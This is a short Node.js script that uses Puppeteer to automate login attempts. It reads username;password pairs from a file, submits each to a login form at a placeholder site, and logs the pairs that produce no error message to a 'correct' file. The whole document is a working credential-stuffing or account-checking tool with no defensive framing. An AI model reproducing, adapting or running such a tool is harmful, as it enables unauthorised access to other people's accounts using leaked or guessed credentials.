const fs = require('fs')
const puppeteer = require('puppeteer')
var archive = fs.readFileSync('list.txt', 'utf-8')
var lines = archive.split(/\r?\n/)

async function process () {  

 for(line of lines) {
    var newline = line.split(';')

    console.log(`User: ${newline[0]}, Password: ${newline[1]}`)

    const browser = await puppeteer.launch({
            headless: true,
          });

          const page = await browser.newPage();
          page.waitForTimeout(2000)    

          await page.goto('https://example.com');         
          await page.type('[type="user"]', newline[0])          
          await page.type('[type="P=password"]', newline[1])          
          await page.click('[type="submit"]')
          await page.waitForTimeout(2000) 

          try {           
           go =  await page.waitForSelector('[class="Error Message"]', {visible: true}); //or Error Code
           if (go) {
             console.log("incorrect!!")
           }
          } catch (error) {            
            fs.appendFile('correct.txt', `${newline[0]}, ${newline[1]}, '\n\r'`, function (err) {
              if (err) throw err;
              console.log('Correct!!' + error);
            })
          }
         
          await page.waitForTimeout(1000)
          await browser.close()
    }  
}
process()
